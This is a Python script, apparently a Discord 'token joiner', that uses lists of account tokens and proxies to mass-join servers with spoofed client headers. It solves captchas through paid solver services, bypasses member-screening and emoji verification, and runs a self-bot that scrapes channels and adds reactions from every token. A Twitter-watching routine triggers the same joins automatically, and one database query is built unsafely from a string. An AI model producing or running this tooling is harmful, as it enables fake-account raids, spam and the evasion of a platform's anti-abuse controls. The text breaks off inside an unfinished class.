from json import loads

import os
from os import system

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get

import threading

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import webdriver_manager
except:
    os.system("pip install webdriver_manager")
    import webdriver_manager

try:
    import pypresence
except:
    os.system("pip install colorama")
    import pypresence

try:
    import anticaptchaofficial
except:
    os.system("pip install anticaptchaofficial")
    import anticaptchaofficial

try:
    import capmonster_python
except:
    os.system("pip install capmonster_python")
    import capmonster_python

try:
    import discord
except:
    os.system("pip install discord")
    import discord

from discord.ext import commands

try:
    import pyautogui
except:
    os.system("pip install pyautogui")
    import pyautogui

import time
import re

try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json

try:
    import base64
except:
    os.system('pip install base64')
    import base64

import string
import sys
from colorama import Fore

try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej

try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket

try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio

try:
    import discum
except:
    os.system('pip install discum')
    import discum

try:
    from selenium import webdriver
except:
    os.system('pip install selenium')
    from selenium import webdriver
from itertools import islice

clearintro = lambda: os.system('cls')
clearintro()
import httpx

from anticaptchaofficial.hcaptchaproxyless import *
from capmonster_python import HCaptchaTask
from random import randint
import urllib
login = True
tokens = open('input/tokens.txt', 'r').read().splitlines()

rs = requests.Session()


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


random.choice(open("input/proxies.txt").read().splitlines())




def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }


def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}


headrrrr = {
    ':authority': 'discord.com',
    ':method': 'GET',
    ':path': '/api/v9/experiments',
    ':scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-encoding': 'gzip, deflate, br,',
    'accept-language': 'cs-CZ,cs;q=0.9',
    'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1'
}
http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch
captchaApi = 'anti-captcha.com'
  

                                

def jooinner():
    proxy = random.choice(open("input/proxies.txt").read().splitlines())
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system("clear")

    tokens_type = "token"

    if tokens_type.lower() != "combo":
        tokens = open("input/tokens.txt", 'r').read().splitlines()
        total_token = len(tokens)
    else:
        tokens = open("input/tokens.txt", "r").read()
        total_token = len(tokens.splitlines())

    headersy = {
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjkzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTMuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwODA0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
        "sec-fetch-dest": "empty",
        "x-debug-options": "bugReporterEnabled",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "accept": "*/*",
        "accept-language": "en-GB",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.16 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "TE": "trailers"
    }

    headers_reg = {
        "accept": "*/*",
        "authority": "discord.com",
        "method": "POST",
        "path": "/api/v9/auth/register",
        "scheme": "https",
        "origin": "discord.com",
        "referer": "discord.com/register",
        "x-debug-options": "bugReporterEnabled",
        "accept-language": "en-US,en;q=0.9",
        "connection": "keep-alive",
        "content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
    }
    settings = open('config.json')
    config = json.load(settings)
    def request_cookie():
        response1 = requests.get("https://discord.com")
        cookie = response1.cookies.get_dict()
        cookie['locale'] = "us"
        return cookie

    def request_fingerprint():
        response2 = requests.get("https://discordapp.com/api/v9/experiments", headers=headers_reg, proxies={"http": f"{proxy}"}).json()
        fingerprint = response2["fingerprint"]
        return fingerprint

    def captcha_bypass(url, key):
        if config['captcha_type'] == "capmonster":
            capmonster = HCaptchaTask(config["capmonster"])
            task_id = capmonster.create_task(url, key)
            result = capmonster.join_task_result(task_id)
            response = result.get("gRecaptchaResponse")
            print(f"{Fore.LIGHTGREEN_EX} [+] Captcha solved {Fore.LIGHTBLACK_EX}({response[-32:]}){Fore.RESET}")
            return response
        else:
            solver = hCaptchaProxyless()
            solver.set_key(config["anticap"])
            solver.set_website_url(url)
            solver.set_website_key(key)
            g_response = solver.solve_and_return_solution()
            if g_response != 0:
                print(
                    f"{Fore.LIGHTGREEN_EX} [+] Captcha bypassed {Fore.LIGHTBLACK_EX}({g_response[-32:]}){Fore.RESET}")
                return g_response

    print(f'''{Fore.CYAN}
                           ░░░░░██╗░█████╗░██╗███╗░░██╗███████╗██████╗░
                           ░░░░░██║██╔══██╗██║████╗░██║██╔════╝██╔══██╗
                           ░░░░░██║██║░░██║██║██╔██╗██║█████╗░░██████╔╝
                           ██╗░░██║██║░░██║██║██║╚████║██╔══╝░░██╔══██╗
                           ╚█████╔╝╚█████╔╝██║██║░╚███║███████╗██║░░██║
                           ░╚════╝░░╚════╝░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝{Fore.CYAN}\t{Fore.RESET}\n''')

    invite_code = input(
        f"{Fore.GREEN} Please Input The Invite Code | Example: In https://discord.gg/suNstX8 Only Add suNstX8 As Input: {Fore.RESET}")
    min_timeout = int(input(f"{Fore.GREEN} Random Timeout From: {Fore.RESET}"))
    max_timeout = int(input(f"{Fore.GREEN} Random Timeout To: {Fore.RESET}"))
    emoji_bypass = input(
        f"{Fore.LIGHTBLUE_EX}Would You Like To Bypass Emoji Verification? | yes/no: {Fore.RESET}")

    if emoji_bypass == "yes":  
        channel_id = int(input(f"{Fore.LIGHTBLUE_EX} Channel ID For Emoji Verification: {Fore.RESET}"))
        message_id = int(input(f"{Fore.LIGHTBLUE_EX} Message ID For Emoji Verification: {Fore.RESET}"))
        emoji_type = input(f"{Fore.LIGHTBLUE_EX} Emoji type (discord/nitro): {Fore.RESET}")

        if emoji_type == "discord":
            emoji_converted = input(
                f"{Fore.LIGHTBLUE_EX} Emoji (https://emojis.wiki/discord/) (https://www.urlencoder.io/): {Fore.RESET}")
        elif emoji_type == "nitro":
            emoji = input(f"{Fore.LIGHTBLUE_EX} Nitro (emojiname:data-id) {Fore.RESET}")
            emoji_converted = urllib.parse.quote_plus(emoji)

    print(f"{Fore.YELLOW}\n [!] Loaded {total_token} Tokens.\n")

    join = 0

    while join < total_token:
        try:

            if tokens_type.lower() != "combo":
                token = tokens[join]
            else:
                token = tokens.split()[join].split(':')[2]

            headersy["authorization"] = token
            headersy["x-fingerprint"] = request_fingerprint()
            response = requests.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headersy,
                                     cookies=request_cookie(), proxies={"http": f"{proxy}"}, timeout=20)
            if response.status_code == 400:
                print(
                    f"{Fore.YELLOW} [!] Captcha {token[:50]}****** detected! Solving.. {Fore.RESET}({Fore.LIGHTBLACK_EX}{response.json()['captcha_sitekey']}{Fore.RESET})")
                response_captcha = requests.post(f"https://discord.com/api/v9/invites/{invite_code}", json={
                    "captcha_key": captcha_bypass("https://discord.com",
                                                  f"{response.json()['captcha_sitekey']}")}, headers=headersy,
                                                 cookies=request_cookie(), proxies={"http": f"{proxy}"}, timeout=20)
                if response_captcha.status_code == 200:
                    print(
                        f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** joined! {Fore.RESET}({Fore.LIGHTBLACK_EX}{invite_code}{Fore.RESET})")
                    body = response_captcha.json()
                    guild_id = body['guild']['id']
                    if 'show_verification_form' in body:
                        get_rules = requests.get(
                            f"https://discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false",
                            headers=headersy, cookies=request_cookie(), proxies={"http": f"{proxy}"}, timeout=20).json()
                        response2 = requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
                                                 headers=headersy, cookies=request_cookie(), json=get_rules,
                                                 proxies={"http": f"{proxy}"}, timeout=20)
                        if response2.status_code == 201 or response2.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** accepted the rules!{Fore.RESET}")
                        else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** not accepted the rules! {Fore.RESET}({Fore.LIGHTBLACK_EX}{response2.content}{Fore.RESET})")
                    if emoji_bypass == "yes":
                        response3 = requests.put(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji_converted}/%40me",
                            headers=headersy, cookies=request_cookie(), proxies={"http": f"{proxy}"}, timeout=20)
                        if response3.status_code == 201 or response3.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** reacted to the emoji!{Fore.RESET}")
                        else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** can't reacted to the emoji! {Fore.RESET}({Fore.LIGHTBLACK_EX}{response3.content}{Fore.RESET})")

            elif response.status_code == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** joined! {Fore.RESET}({Fore.LIGHTBLACK_EX}{invite_code}{Fore.RESET})")
                body = response.json()
                guild_id = body['guild']['id']
                if 'show_verification_form' in body:
                    get_rules = requests.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false",
                        headers=headersy, cookies=request_cookie(), proxies={"http": f"{proxy}"}, timeout=20).json()
                    response2 = requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
                                             headers=headersy, cookies=request_cookie(), json=get_rules,
                                             proxies={"http": f"{proxy}"}, timeout=20)
                    if response2.status_code == 201 or response2.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** accepted the rules!{Fore.RESET}")
                    else:
                        print(
                            f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** not accepted the rules! {Fore.RESET}({Fore.LIGHTBLACK_EX}{response2.content}{Fore.RESET})")
                if emoji_bypass == "yes":
                    response3 = requests.put(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji_converted}/%40me",
                        headers=headersy, cookies=request_cookie(), proxies={"http": f"{proxy}"}, timeout=20)
                    if response3.status_code == 201 or response3.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** reacted to the emoji!{Fore.RESET}")
                    else:
                        print(
                            f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** can't reacted to the emoji! {Fore.RESET}({Fore.LIGHTBLACK_EX}{response3.content}{Fore.RESET})")
            else:
                print(
                    f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** not joined! {Fore.RESET}({Fore.LIGHTBLACK_EX}{response.content}{Fore.RESET})")
            sleeptime = randint(min_timeout, max_timeout)
            print(f"{Fore.LIGHTBLUE_EX} [!] Sleeping for {sleeptime} seconds.{Fore.RESET}")
            time.sleep(sleeptime)
            join += 1

        except Exception as err:
            print(
                f"{Fore.YELLOW} [!] {token[:50]}****** retrying.. {Fore.RESET}({Fore.LIGHTBLACK_EX}{err}{Fore.RESET})")
            join = join - 1
            pass

    def mesagelog():
        with open('input/tokens.txt') as f:
            firstline2 = f.readline().rstrip()
        token = firstline2
        channel = open('staff/channels.txt', 'r').read().splitlines()
        headers = {
            'authorization': token,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        # channel = input('Channel ID: ')
        count = []
        channelwithmax = []
        messid = []
        reactionn = []
        for channelid in channel:
            try:
                r = requests.get(f'https://discord.com/api/v9/channels/{str(channelid)}/messages',
                                 headers=headers)
                jsoon = json.loads(r.text)
                for log in jsoon:
                    try:
                        gu = str(log['reactions'])
                        print(gu)
                        reaction = gu[33:34]
                        count.append(gu[47:48])
                    except:
                        pass

            except:
                print('error')
        print(max(count))
        for channelid in channel:
            try:
                r = requests.get(f'https://discord.com/api/v9/channels/{str(channelid)}/messages',
                                 headers=headers)
                jsoon = json.loads(r.text)
                for log in jsoon:
                    try:
                        gu = str(log['reactions'])
                        fb = gu[47:48]
                        if fb == max(count):
                            gu2 = str(log['reactions'])
                            mess = str(log['id'])
                            channelwithmax.append(str(channelid))
                            messid.append(str(mess))
                            reactionn.append(gu2[33:34])
                    except:
                        pass

            except:
                print('error')

        def reaction(chd, iddd, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       "sec-fetch-dest": "empty",
                       "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin",
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            a = rs.put(
                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{org}/@me",
                headers=headers)
            if a.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
            else:
                print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")

        tokens = open('input/tokens.txt', 'r').read().splitlines()
        cs = str(channelwithmax[0])
        cc = str(messid[0])
        mm = str(reactionn[0])
        # y = mm.encode('utf-8')
        # c = str(y)
        # c.split("'")
        # m = c[2:-1]
        # print(m)
        for token in tokens:
            reaction(cs, cc, mm, token)

    intents = discord.Intents.all()
    intents.members = True
    client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)
    server_id = input('Server ID: ')
    with open('input/tokens.txt') as f:
        firstline2 = f.readline().rstrip()
    token = firstline2

    class ChannelScraper:
        with open('staff/channels.txt', 'w') as c:
            c.write('[wait]')

        async def Scrape(self):
            await client.wait_until_ready()
            guildOBJ = client.get_guild(int(server_id))

            channelcount = 0
            with open('staff/channels.txt', 'w') as c:
                for channel in guildOBJ.channels:
                    c.write(str(channel.id) + "\n")
                    channelcount += 1
                c.close()
                mesagelog()

        async def Menu(self):
            await self.Scrape()

        @client.event
        async def on_ready(*Args):
            await ChannelScraper().Menu()

        def Check(self):
            client.run(token, bot=False)

        print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Scraping channels, It will take second...')

    ChannelScraper().Check()


# Основной код
def twitter():
    import tweepy
    import configparser
    import re
    import requests
    import urlexpander as ue
    import sqlite3
    import time
    import os
    import undetected_chromedriver as uc
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.common.by import By

    class1 = ('contents-3ca1mk')
    xpath1 = ('/html/body/div[1]/div[2]/div/div/div/div/form/div/div/div[1]/div[2]/div[1]/div/div[2]/input')
    xpath2 = ('/html/body/div[1]/div[2]/div/div/div/div/form/div/div/div[1]/div[2]/div[2]/div/input')
    xpath3 = ('/html/body/div[1]/div[2]/div/div/div/div/form/div/div/div[1]/div[2]/button[2]')
    username = input("Enter username: ")
    timer = float(input("Enter time between requests (in seconds): "))
    time.sleep(0.5)
    os.system('cls')
    print('Script is running')

    # Config
    config = configparser.ConfigParser()
    config.read("config.ini")
    api_key = config['twitter']['api_key']
    api_key_secret = config['twitter']['api_key_secret']
    access_token = config['twitter']['access_token']
    access_token_secret = config['twitter']['access_token_secret']

    # Authorization
    auth = tweepy.OAuthHandler(api_key, api_key_secret)
    auth.set_access_token(access_token, access_token_secret)
    api = tweepy.API(auth)

    # Browser
    browser = uc.Chrome(use_subprocess=True)
    browser.get('https://discord.com/login')
    time.sleep(10)
    wait = WebDriverWait(browser, 15)

    # Getting tweets
    user = username
    limit = 5
    # Creating database
    db = sqlite3.connect('invitelinks.db')
    sql = db.cursor()

    sql.execute("""CREATE TABLE IF NOT EXISTS tweets (
        user TEXT,
        link TEXT
    )""")
    db.commit()
    while True:
        result = None
        if result is None:
            result = api.user_timeline(screen_name=user, count=limit, tweet_mode='extended')
            time.sleep(timer)
            print('Waiting for link')
        for tweet in result:
            url_pattern = r'http(?:s)?://\S+'  # Finding link in tweet
            urls = re.findall(url_pattern, tweet.full_text)
            link = ue.expand(urls)
            asktoken = input('Do you want to input tokens y/n?: ').lower()
            webhook = input('Webhook: ')
            link = link.replace("https://discord.gg/", "")
            link = link.replace("discord.gg/", "")
            link = link.replace("https://discord.com/invite/", "")
            tokens = open('input/tokens.txt', 'r').read().splitlines()
            if asktoken == 'n':
                askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
                if askusetokens == 'y':
                    asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                    if asktokens == 'y':
                        tokens = open('input/tokens.txt', 'r').read().splitlines()
                        for tokenss in tokens:
                            joiner = Joiner(link, tokenss)
                            joiner.joinServer()
                            r = requests.post(webhook, 'done')
                    else:
                        howmany = int(input('How many tokens do you wanna use?: '))
                        with open("input/tokens.txt") as myfile:
                            head = list(islice(myfile, howmany))
                        for tokenss in head:
                            joiner = Joiner(link, tokenss)
                            joiner.joinServer()
                            r = requests.post(webhook, 'done')
            else:
                token = input('Token: ')
                # joiner.joinServer()
            b = input('Do you want to bypass member screening y/n?: ')

            if b == 'y':
                def bpss(invite_code, serverId, token):
                    headers = {
                        'Content-Type': 'application/json',
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US',
                        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        'DNT': '1',
                        'origin': 'https://discord.com',
                        'TE': 'Trailers',
                        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                        'authorization': token,
                        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
                    bpsur = f"https://discord.com/api/v9/guilds/{serverId}/member-verification?with_guild=false&invite_code=" + invite_code
                    r1 = rs.get(bpsur, headers=headers).json()
                    data = {}
                    data['version'] = r1['version']
                    data['form_fields'] = r1['form_fields']
                    data['form_fields'][0]['response'] = True
                    req = f"https://discord.com/api/v9/guilds/{str(serverId)}/requests/@me"
                    rs.put(req, headers=headers, json=data)

                serverId = input('Server ID: ')
                tokens = open('input/tokens.txt', 'r').read().splitlines()
                for token in tokens:
                    threading.Thread(target=bpss, args=(link, serverId, token)).start()

            elif b == 'n':
                pass

            with open('input/tokens.txt') as f:
                token = f.readline()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                'Authorization': token
            }

            guildId = input(f"\n{Fore.LIGHTRED_EX} Enter Guild ID. [>] ")

            response = requests.get(
                f"https://discord.com/api/guilds/{guildId}",
                headers=headers,
                params={"with_counts": True}
            ).json()

            owner = requests.get(
                f"https://discord.com/api/guilds/{guildId}/members/{response['owner_id']}",
                headers=headers,
                params={"with_counts": True}
            ).json()

            print(f"""{Fore.LIGHTBLUE_EX}
                       Guild/Server | Name > {response['name']} 
                       Guild/Server | ID > {response['id']}
                       Guild/Server | Icon URL > https://cdn.discordapp.com/icons/{guildId}/{response['icon']}.webp?size=256
                       Guild/Server | Approxomate Amount of Members > {response['approximate_member_count']}
                       Guild/Server | Owner > {owner['user']['username']}#{owner['user']['discriminator']} 
                       Guild/Server | Owner ID > {response['owner_id']}
                       Guild/Server | Region > {response['region']}
                       """)

            def mesagelog():
                with open('input/tokens.txt') as f:
                    firstline2 = f.readline().rstrip()
                token = firstline2
                channel = open('staff/channels.txt', 'r').read().splitlines()
                headers = {
                    'authorization': token,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                # channel = input('Channel ID: ')
                count = []
                channelwithmax = []
                messid = []
                reactionn = []
                for channelid in channel:
                    try:
                        r = requests.get(f'https://discord.com/api/v9/channels/{str(channelid)}/messages',
                                         headers=headers)
                        jsoon = json.loads(r.text)
                        for log in jsoon:
                            try:
                                gu = str(log['reactions'])
                                print(gu)
                                reaction = gu[33:34]
                                count.append(gu[47:48])
                            except:
                                pass

                    except:
                        print('error')
                print(max(count))
                for channelid in channel:
                    try:
                        r = requests.get(f'https://discord.com/api/v9/channels/{str(channelid)}/messages',
                                         headers=headers)
                        jsoon = json.loads(r.text)
                        for log in jsoon:
                            try:
                                gu = str(log['reactions'])
                                fb = gu[47:48]
                                if fb == max(count):
                                    gu2 = str(log['reactions'])
                                    mess = str(log['id'])
                                    channelwithmax.append(str(channelid))
                                    messid.append(str(mess))
                                    reactionn.append(gu2[33:34])
                            except:
                                pass

                    except:
                        print('error')

                def reaction(chd, iddd, org, token):
                    headers = {'Content-Type': 'application/json',
                               'Accept': '*/*',
                               'Accept-Encoding': 'gzip, deflate, br',
                               'Accept-Language': 'en-US',
                               'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                               'DNT': '1',
                               'origin': 'https://discord.com',
                               "sec-fetch-dest": "empty",
                               "sec-fetch-mode": "cors",
                               "sec-fetch-site": "same-origin",
                               'TE': 'Trailers',
                               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                               'authorization': token,
                               'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                               }

                    a = rs.put(
                        f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{org}/@me",
                        headers=headers)
                    if a.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
                    else:
                        print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")

                tokens = open('input/tokens.txt', 'r').read().splitlines()
                cs = str(channelwithmax[0])
                cc = str(messid[0])
                mm = str(reactionn[0])
                # y = mm.encode('utf-8')
                # c = str(y)
                # c.split("'")
                # m = c[2:-1]
                # print(m)
                for token in tokens:
                    reaction(cs, cc, mm, token)

            intents = discord.Intents.all()
            intents.members = True
            client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)
            server_id = input('Server ID: ')
            with open('input/tokens.txt') as f:
                firstline2 = f.readline().rstrip()
            token = firstline2

            class ChannelScraper:
                with open('staff/channels.txt', 'w') as c:
                    c.write('[wait]')

                async def Scrape(self):
                    await client.wait_until_ready()
                    guildOBJ = client.get_guild(int(server_id))

                    channelcount = 0
                    with open('staff/channels.txt', 'w') as c:
                        for channel in guildOBJ.channels:
                            c.write(str(channel.id) + "\n")
                            channelcount += 1
                        c.close()
                        mesagelog()

                async def Menu(self):
                    await self.Scrape()

                @client.event
                async def on_ready(*Args):
                    await ChannelScraper().Menu()

                def Check(self):
                    client.run(token, bot=False)

                print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Scraping channels, It will take second...')

            ChannelScraper().Check()
            global linkds
            linkds = "".join(link)
            if "discord" in linkds:
                sql.execute(f"SELECT link FROM tweets WHERE link = '{linkds}'")
                if sql.fetchone() is None:
                    sql.execute(f"INSERT INTO tweets VALUES (?, ?)", (tweet.user.screen_name, linkds))
                    db.commit()
                    browser.get(linkds)
                    wait.until(EC.visibility_of_element_located((By.CLASS_NAME, 'contents-3ca1mk')))
                    browser.find_element_by_class_name(class1).click()
                    print('Success')
                else:
                    None
            else:
                None


class Joiner:
    def __init__(self, inv, token):
        with open('config.json', 'r') as myfile:
            data = myfile.read()

        # parse file
